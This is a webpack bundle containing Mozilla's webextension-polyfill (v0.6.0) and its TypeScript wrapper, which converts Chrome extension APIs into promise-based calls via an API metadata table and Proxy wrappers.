/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ({

/***/ "../node_modules/webextension-polyfill-ts/lib/index.js":
/*!*************************************************************!*\
  !*** ../node_modules/webextension-polyfill-ts/lib/index.js ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

Object.defineProperty(exports, "__esModule", { value: true });

// if not in a browser, assume we're in a test, return a dummy
if (typeof window === "undefined") exports.browser = {};
else exports.browser = __webpack_require__(/*! webextension-polyfill */ "../node_modules/webextension-polyfill/dist/browser-polyfill.js");


/***/ }),

/***/ "../node_modules/webextension-polyfill/dist/browser-polyfill.js":
/*!**********************************************************************!*\
  !*** ../node_modules/webextension-polyfill/dist/browser-polyfill.js ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;(function (global, factory) {
  if (true) {
    !(__WEBPACK_AMD_DEFINE_ARRAY__ = [module], __WEBPACK_AMD_DEFINE_FACTORY__ = (factory),
				__WEBPACK_AMD_DEFINE_RESULT__ = (typeof __WEBPACK_AMD_DEFINE_FACTORY__ === 'function' ?
				(__WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__)) : __WEBPACK_AMD_DEFINE_FACTORY__),
				__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
  } else { var mod; }
})(typeof globalThis !== "undefined" ? globalThis : typeof self !== "undefined" ? self : this, function (module) {
  /* webextension-polyfill - v0.6.0 - Mon Dec 23 2019 12:32:53 */

  /* -*- Mode: indent-tabs-mode: nil; js-indent-level: 2 -*- */

  /* vim: set sts=2 sw=2 et tw=80: */

  /* This Source Code Form is subject to the terms of the Mozilla Public
   * License, v. 2.0. If a copy of the MPL was not distributed with this
   * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
  "use strict";

  if (typeof browser === "undefined" || Object.getPrototypeOf(browser) !== Object.prototype) {
    const CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE = "The message port closed before a response was received.";
    const SEND_RESPONSE_DEPRECATION_WARNING = "Returning a Promise is the preferred way to send a reply from an onMessage/onMessageExternal listener, as the sendResponse will be removed from the specs (See https://developer.mozilla.org/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage)"; // Wrapping the bulk of this polyfill in a one-time-use function is a minor
    // optimization for Firefox. Since Spidermonkey does not fully parse the
    // contents of a function until the first time it's called, and since it will
    // never actually need to be called, this allows the polyfill to be included
    // in Firefox nearly for free.

    const wrapAPIs = extensionAPIs => {
      // NOTE: apiMetadata is associated to the content of the api-metadata.json file
      // at build time by replacing the following "include" with the content of the
      // JSON file.
      const apiMetadata = {
        "alarms": {
          "clear": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "clearAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "get": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "bookmarks": {
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getChildren": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getRecent": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getSubTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTree": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "browserAction": {
          "disable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "enable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "getBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getBadgeText": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "openPopup": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setBadgeText": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "browsingData": {
          "remove": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "removeCache": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCookies": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeDownloads": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFormData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeHistory": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeLocalStorage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePasswords": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePluginData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "settings": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "commands": {
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "contextMenus": {
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "cookies": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAllCookieStores": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "set": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "devtools": {
          "inspectedWindow": {
            "eval": {
              "minArgs": 1,
              "maxArgs": 2,
              "singleCallbackArg": false
            }
          },
          "panels": {
            "create": {
              "minArgs": 3,
              "maxArgs": 3,
              "singleCallbackArg": true
            }
          }
        },
        "downloads": {
          "cancel": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "download": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "erase": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFileIcon": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "open": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "pause": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFile": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "resume": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "extension": {
          "isAllowedFileSchemeAccess": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "isAllowedIncognitoAccess": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "history": {
          "addUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "deleteRange": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getVisits": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "i18n": {
          "detectLanguage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAcceptLanguages": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "identity": {
          "launchWebAuthFlow": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "idle": {
          "queryState": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "management": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getSelf": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setEnabled": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "uninstallSelf": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "notifications": {
          "clear": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPermissionLevel": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "pageAction": {
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "hide": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "permissions": {
          "contains": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "request": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "runtime": {
          "getBackgroundPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPlatformInfo": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "openOptionsPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "requestUpdateCheck": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "sendMessage": {
            "minArgs": 1,
            "maxArgs": 3
          },
          "sendNativeMessage": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "setUninstallURL": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "sessions": {
          "getDevices": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getRecentlyClosed": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "restore": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "storage": {
          "local": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          },
          "managed": {
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            }
          },
          "sync": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          }
        },
        "tabs": {
          "captureVisibleTab": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "detectLanguage": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "discard": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "duplicate": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "executeScript": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getZoom": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getZoomSettings": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "highlight": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "insertCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "query": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "reload": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "sendMessage": {
            "minArgs": 2,
            "maxArgs": 3
          },
          "setZoom": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "setZoomSettings": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "update": {
            "minArgs": 1,
            "maxArgs": 2
          }
        },
        "topSites": {
          "get": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "webNavigation": {
          "getAllFrames": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFrame": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "webRequest": {
          "handlerBehaviorChanged": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "windows": {
          "create": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getLastFocused": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        }
      };

      if (Object.keys(apiMetadata).length === 0) {
        throw new Error("api-metadata.json has not been included in browser-polyfill");
      }
      /**
       * A WeakMap subclass which creates and stores a value for any key which does
       * not exist when accessed, but behaves exactly as an ordinary WeakMap
       * otherwise.
       *
       * @param {function} createItem
       *        A function which will be called in order to create the value for any
       *        key which does not exist, the first time it is accessed. The
       *        function receives, as its only argument, the key being created.
       */


      class DefaultWeakMap extends WeakMap {
        constructor(createItem, items = undefined) {
          super(items);
          this.createItem = createItem;
        }

        get(key) {
          if (!this.has(key)) {
            this.set(key, this.createItem(key));
          }

          return super.get(key);
        }

      }
      /**
       * Returns true if the given object is an object with a `then` method, and can
       * therefore be assumed to behave as a Promise.
       *
       * @param {*} value The value to test.
       * @returns {boolean} True if the value is thenable.
       */


      const isThenable = value => {
        return value && typeof value === "object" && typeof value.then === "function";
      };
      /**
       * Creates and returns a function which, when called, will resolve or reject
       * the given promise based on how it is called:
       *
       * - If, when called, `chrome.runtime.lastError` contains a non-null object,
       *   the promise is rejected with that value.
       * - If the function is called with exactly one argument, the promise is
       *   resolved to that value.
       * - Otherwise, the promise is resolved to an array containing all of the
       *   function's arguments.
       *
       * @param {object} promise
       *        An object containing the resolution and rejection functions of a
       *        promise.
       * @param {function} promise.resolve
       *        The promise's resolution function.
       * @param {function} promise.rejection
       *        The promise's rejection function.
       * @param {object} metadata
       *        Metadata about the wrapped method which has created the callback.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function}
       *        The generated callback function.
       */


      const makeCallback = (promise, metadata) => {
        return (...callbackArgs) => {
          if (extensionAPIs.runtime.lastError) {
            promise.reject(extensionAPIs.runtime.lastError);
          } else if (metadata.singleCallbackArg || callbackArgs.length <= 1 && metadata.singleCallbackArg !== false) {
            promise.resolve(callbackArgs[0]);
          } else {
            promise.resolve(callbackArgs);
          }
        };
      };

      const pluralizeArguments = numArgs => numArgs == 1 ? "argument" : "arguments";
      /**
       * Creates a wrapper function for a method with the given name and metadata.
       *
       * @param {string} name
       *        The name of the method which is being wrapped.
       * @param {object} metadata
       *        Metadata about the method being wrapped.
       * @param {integer} metadata.minArgs
       *        The minimum number of arguments which must be passed to the
       *        function. If called with fewer than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxArgs
       *        The maximum number of arguments which may be passed to the
       *        function. If called with more than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function(object, ...*)}
       *       The generated wrapper function.
       */


      const wrapAsyncFunction = (name, metadata) => {
        return function asyncFunctionWrapper(target, ...args) {
          if (args.length < metadata.minArgs) {
            throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
          }

          if (args.length > metadata.maxArgs) {
            throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
          }

          return new Promise((resolve, reject) => {
            if (metadata.fallbackToNoCallback) {
              // This API method has currently no callback on Chrome, but it return a promise on Firefox,
              // and so the polyfill will try to call it with a callback first, and it will fallback
              // to not passing the callback if the first call fails.
              try {
                target[name](...args, makeCallback({
                  resolve,
                  reject
                }, metadata));
              } catch (cbError) {
                console.warn(`${name} API method doesn't seem to support the callback parameter, ` + "falling back to call it without a callback: ", cbError);
                target[name](...args); // Update the API method metadata, so that the next API calls will not try to
                // use the unsupported callback anymore.

                metadata.fallbackToNoCallback = false;
                metadata.noCallback = true;
                resolve();
              }
            } else if (metadata.noCallback) {
              target[name](...args);
              resolve();
            } else {
              target[name](...args, makeCallback({
                resolve,
                reject
              }, metadata));
            }
          });
        };
      };
      /**
       * Wraps an existing method of the target object, so that calls to it are
       * intercepted by the given wrapper function. The wrapper function receives,
       * as its first argument, the original `target` object, followed by each of
       * the arguments passed to the original method.
       *
       * @param {object} target
       *        The original target object that the wrapped method belongs to.
       * @param {function} method
       *        The method being wrapped. This is used as the target of the Proxy
       *        object which is created to wrap the method.
       * @param {function} wrapper
       *        The wrapper function which is called in place of a direct invocation
       *        of the wrapped method.
       *
       * @returns {Proxy<function>}
       *        A Proxy object for the given method, which invokes the given wrapper
       *        method in its place.
       */


      const wrapMethod = (target, method, wrapper) => {
        return new Proxy(method, {
          apply(targetMethod, thisObj, args) {
            return wrapper.call(thisObj, target, ...args);
          }

        });
      };

      let hasOwnProperty = Function.call.bind(Object.prototype.hasOwnProperty);
      /**
       * Wraps an object in a Proxy which intercepts and wraps certain methods
       * based on the given `wrappers` and `metadata` objects.
       *
       * @param {object} target
       *        The target object to wrap.
       *
       * @param {object} [wrappers = {}]
       *        An object tree containing wrapper functions for special cases. Any
       *        function present in this object tree is called in place of the
       *        method in the same location in the `target` object tree. These
       *        wrapper methods are invoked as described in {@see wrapMethod}.
       *
       * @param {object} [metadata = {}]
       *        An object tree containing metadata used to automatically generate
       *        Promise-based wrapper functions for asynchronous. Any function in
       *        the `target` object tree which has a corresponding metadata object
       *        in the same location in the `metadata` tree is replaced with an
       *        automatically-generated wrapper function, as described in
       *        {@see wrapAsyncFunction}
       *
       * @returns {Proxy<object>}
       */

      const wrapObject = (target, wrappers = {}, metadata = {}) => {
        let cache = Object.create(null);
        let handlers = {
          has(proxyTarget, prop) {
            return prop in target || prop in cache;
          },

          get(proxyTarget, prop, receiver) {
            if (prop in cache) {
              return cache[prop];
            }

            if (!(prop in target)) {
              return undefined;
            }

            let value = target[prop];

            if (typeof value === "function") {
              // This is a method on the underlying object. Check if we need to do
              // any wrapping.
              if (typeof wrappers[prop] === "function") {
                // We have a special-case wrapper for this method.
                value = wrapMethod(target, target[prop], wrappers[prop]);
              } else if (hasOwnProperty(metadata, prop)) {
                // This is an async method that we have metadata for. Create a
                // Promise wrapper for it.
                let wrapper = wrapAsyncFunction(prop, metadata[prop]);
                value = wrapMethod(target, target[prop], wrapper);
              } else {
                // This is a method that we don't know or care about. Return the
                // original method, bound to the underlying object.
                value = value.bind(target);
              }
            } else if (typeof value === "object" && value !== null && (hasOwnProperty(wrappers, prop) || hasOwnProperty(metadata, prop))) {
              // This is an object that we need to do some wrapping for the children
              // of. Create a sub-object wrapper for it with the appropriate child
              // metadata.
              value = wrapObject(value, wrappers[prop], metadata[prop]);
            } else if (hasOwnProperty(metadata, "*")) {
              // Wrap all properties in * namespace.
              value = wrapObject(value, wrappers[prop], metadata["*"]);
            } else {
              // We don't need to do any wrapping for this property,
              // so just forward all access to the underlying object.
              Object.defineProperty(cache, prop, {
                configurable: true,
                enumerable: true,

                get() {
                  return target[prop];
                },

                set(value) {
                  target[prop] = value;
                }

              });
              return value;
            }

            cache[prop] = value;
            return value;
          },

          set(proxyTarget, prop, value, receiver) {
            if (prop in cache) {
              cache[prop] = value;
            } else {
              target[prop] = value;
            }

            return true;
          },

          defineProperty(proxyTarget, prop, desc) {
            return Reflect.defineProperty(cache, prop, desc);
          },

          deleteProperty(proxyTarget, prop) {
            return Reflect.deleteProperty(cache, prop);
          }

        }; // Per contract of the Proxy API, the "get" proxy handler must return the
        // original value of the target if that value is declared read-only and
        // non-configurable. For this reason, we create an object with the
        // prototype set to `target` instead of using `target` directly.
        // Otherwise we cannot return a custom object for APIs that
        // are declared read-only and non-configurable, such as `chrome.devtools`.
        //
        // The proxy handlers themselves will still use the original `target`
        // instead of the `proxyTarget`, so that the methods and properties are
        // dereferenced via the original targets.

        let proxyTarget = Object.create(target);
        return new Proxy(proxyTarget, handlers);
      };
      /**
       * Creates a set of wrapper functions for an event object, which handles
       * wrapping of listener functions that those messages are passed.
       *
       * A single wrapper is created for each listener function, and stored in a
       * map. Subsequent calls to `addListener`, `hasListener`, or `removeListener`
       * retrieve the original wrapper, so that  attempts to remove a
       * previously-added listener work as expected.
       *
       * @param {DefaultWeakMap<function, function>} wrapperMap
       *        A DefaultWeakMap object which will create the appropriate wrapper
       *        for a given listener function when one does not exist, and retrieve
       *        an existing one when it does.
       *
       * @returns {object}
       */


      const wrapEvent = wrapperMap => ({
        addListener(target, listener, ...args) {
          target.addListener(wrapperMap.get(listener), ...args);
        },

        hasListener(target, listener) {
          return target.hasListener(wrapperMap.get(listener));
        },

        removeListener(target, listener) {
          target.removeListener(wrapperMap.get(listener));
        }

      }); // Keep track if the deprecation warning has been logged at least once.


      let loggedSendResponseDeprecationWarning = false;
      const onMessageWrappers = new DefaultWeakMap(listener => {
        if (typeof listener !== "function") {
          return listener;
        }
        /**
         * Wraps a message listener function so that it may send responses based on
         * its return value, rather than by returning a sentinel value and calling a
         * callback. If the listener function returns a Promise, the response is
         * sent when the promise either resolves or rejects.
         *
         * @param {*} message
         *        The message sent by the other end of the channel.
         * @param {object} sender
         *        Details about the sender of the message.
         * @param {function(*)} sendResponse
         *        A callback which, when called with an arbitrary argument, sends
         *        that value as a response.
         * @returns {boolean}
         *        True if the wrapped listener returned a Promise, which will later
         *        yield a response. False otherwise.
         */


        return function onMessage(message, sender, sendResponse) {
          let didCallSendResponse = false;
          let wrappedSendResponse;
          let sendResponsePromise = new Promise(resolve => {
            wrappedSendResponse = function (response) {
              if (!loggedSendResponseDeprecationWarning) {
                console.warn(SEND_RESPONSE_DEPRECATION_WARNING, new Error().stack);
                loggedSendResponseDeprecationWarning = true;
              }

              didCallSendResponse = true;
              resolve(response);
            };
          });
          let result;

          try {
            result = listener(message, sender, wrappedSendResponse);
          } catch (err) {
            result = Promise.reject(err);
          }

          const isResultThenable = result !== true && isThenable(result); // If the listener didn't returned true or a Promise, or called
          // wrappedSendResponse synchronously, we can exit earlier
          // because there will be no response sent from this listener.

          if (result !== true && !isResultThenable && !didCallSendResponse) {
            return false;
          } // A small helper to send the message if the promise resolves
          // and an error if the promise rejects (a wrapped sendMessage has
          // to translate the message into a resolved promise or a rejected
          // promise).


          const sendPromisedResult = promise => {
            promise.then(msg => {
              // send the message value.
              sendResponse(msg);
            }, error => {
              // Send a JSON representation of the error if the rejected value
              // is an instance of error, or the object itself otherwise.
              let message;

              if (error && (error instanceof Error || typeof error.message === "string")) {
                message = error.message;
              } else {
                message = "An unexpected error occurred";
              }

              sendResponse({
                __mozWebExtensionPolyfillReject__: true,
                message
              });
            }).catch(err => {
              // Print an error on the console if unable to send the response.
              console.error("Failed to send onMessage rejected reply", err);
            });
          }; // If the listener returned a Promise, send the resolved value as a
          // result, otherwise wait the promise related to the wrappedSendResponse
          // callback to resolve and send it as a response.


          if (isResultThenable) {
            sendPromisedResult(result);
          } else {
            sendPromisedResult(sendResponsePromise);
          } // Let Chrome know that the listener is replying.


          return true;
        };
      });

      const wrappedSendMessageCallback = ({
        reject,
        resolve
      }, reply) => {
        if (extensionAPIs.runtime.lastError) {
          // Detect when none of the listeners replied to the sendMessage call and resolve
          // the promise to undefined as in Firefox.
          // See https://github.com/mozilla/webextension-polyfill/issues/130
          if (extensionAPIs.runtime.lastError.message === CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE) {
            resolve();
          } else {
            reject(extensionAPIs.runtime.lastError);
          }
        } else if (reply && reply.__mozWebExtensionPolyfillReject__) {
          // Convert back the JSON representation of the error into
          // an Error instance.
          reject(new Error(reply.message));
        } else {
          resolve(reply);
        }
      };

      const wrappedSendMessage = (name, metadata, apiNamespaceObj, ...args) => {
        if (args.length < metadata.minArgs) {
          throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
        }

        if (args.length > metadata.maxArgs) {
          throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
        }

        return new Promise((resolve, reject) => {
          const wrappedCb = wrappedSendMessageCallback.bind(null, {
            resolve,
            reject
          });
          args.push(wrappedCb);
          apiNamespaceObj.sendMessage(...args);
        });
      };

      const staticWrappers = {
        runtime: {
          onMessage: wrapEvent(onMessageWrappers),
          onMessageExternal: wrapEvent(onMessageWrappers),
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 1,
            maxArgs: 3
          })
        },
        tabs: {
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 2,
            maxArgs: 3
          })
        }
      };
      const settingMetadata = {
        clear: {
          minArgs: 1,
          maxArgs: 1
        },
        get: {
          minArgs: 1,
          maxArgs: 1
        },
        set: {
          minArgs: 1,
          maxArgs: 1
        }
      };
      apiMetadata.privacy = {
        network: {
          "*": settingMetadata
        },
        services: {
          "*": settingMetadata
        },
        websites: {
          "*": settingMetadata
        }
      };
      return wrapObject(extensionAPIs, staticWrappers, apiMetadata);
    };

    if (typeof chrome != "object" || !chrome || !chrome.runtime || !chrome.runtime.id) {
      throw new Error("This script should only be loaded in a browser extension.");
    } // The build process adds a UMD wrapper around this file, which makes the
    // `module` variable available.


    module.exports = wrapAPIs(chrome);
  } else {
    module.exports = browser;
  }
});
//# sourceMappingURL=browser-polyfill.js.map


/***/ }),

